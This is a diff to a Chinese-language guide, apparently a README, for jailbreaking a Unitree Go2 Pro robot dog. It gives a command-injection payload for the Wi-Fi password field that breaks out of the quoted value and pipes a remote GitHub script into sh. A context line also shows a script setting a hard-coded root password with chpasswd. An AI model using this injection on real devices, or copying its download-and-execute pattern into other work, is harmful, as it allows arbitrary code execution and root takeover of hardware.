@@ -20,8 +20,8 @@ echo "echo 'root:MySecurePass123!' | chpasswd" >> "$FILE"
 例如：Go2Robot@2024!
 
 2. 上传到 GitHub
-你的脚本已经在：''https://raw.githubusercontent.com/tkdggg/jailbreak_Unitree_Go2Pro/main/jailbreak.sh''
-所以不需要改命令，命令仍然是：
+脚本已经在：''https://raw.githubusercontent.com/tkdggg/jailbreak_Unitree_Go2Pro/main/jailbreak.sh''
+运行命令：
 ```
 wifi_pass";curl -L https://raw.githubusercontent.com/tkdggg/jailbreak_Unitree_Go2Pro/main/jailbreak.sh|sh;#
 
